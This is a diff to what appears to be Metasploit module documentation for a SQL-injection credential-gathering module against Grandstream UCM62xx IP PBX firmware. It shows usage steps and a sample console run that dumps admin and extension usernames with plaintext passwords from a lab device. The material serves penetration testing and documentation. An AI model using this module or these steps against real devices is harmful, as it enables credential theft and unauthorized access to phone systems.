@@ -22,8 +22,10 @@ However, if you have a device, affected firmware can be downloaded here:
 ## Verification Steps
 
 * Acquire an affected device and configure it with the affected firmware
-* Do: `use auxiliary/scanner/http/grandstream_ucm62xx_sql_account_guess`
+* Do: `use auxiliary/gather/grandstream_ucm62xx_sql_account_guess`
 * Do: `set RHOST <ip>`
+* Do: `check`
+* Do: Verify the remote host is vulnerable.
 * Do: `run`
 * You should get a list of valid credentials for the target device.
 
@@ -38,33 +40,25 @@ Specifies base URI. The default value is `/`.
 ### Grandstream UCM6202 IP PBX firmware version 1.0.20.20
 
 ```
-msf6 > use auxiliary/scanner/http/grandstream_ucm62xx_sql_account_guess
-msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) > set RHOST 10.0.0.9
-RHOST => 10.0.0.9
-msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) > show options
+msf6 > use auxiliary/gather/grandstream_ucm62xx_sql_account_guess
+msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > set RHOST 10.0.0.7
+RHOST => 10.0.0.7
+msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > check
 
-Module options (auxiliary/scanner/http/grandstream_ucm62xx_sql_account_guess):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS     10.0.0.9         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
-   RPORT      8089             yes       The target port (TCP)
-   SSL        true             no        Negotiate SSL/TLS for outgoing connections
-   TARGETURI  /                yes       Base path
-   THREADS    1                yes       The number of concurrent threads (max one per host)
-   VHOST                       no        HTTP server virtual host
-
-msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) > run
 [*] Requesting version information from /cgi
-[*] The reported version is: 1.0.20.20
+[*] 10.0.0.7:8089 - The target appears to be vulnerable. The self-reported version is: 1.0.20.20
+msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > run
+[*] Running module against 10.0.0.7
+
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Requesting version information from /cgi
+[+] The target appears to be vulnerable. The self-reported version is: 1.0.20.20
 [*] Found the following username and password: admin - cheesed00dle
 [*] Found the following username and password: 1000 - gZ15S8O8U5S72oli
 [*] Found the following username and password: 1001 - qK6uRxwC
 [*] Found the following username and password: 1002 - aP9ux515W7p5U
 [*] Found the following username and password: 1003 - pM6mo!E8u37k
 [*] Found the following username and password: 1004 - mC7N68dm8h
-[*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) >
+msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > 
 ```
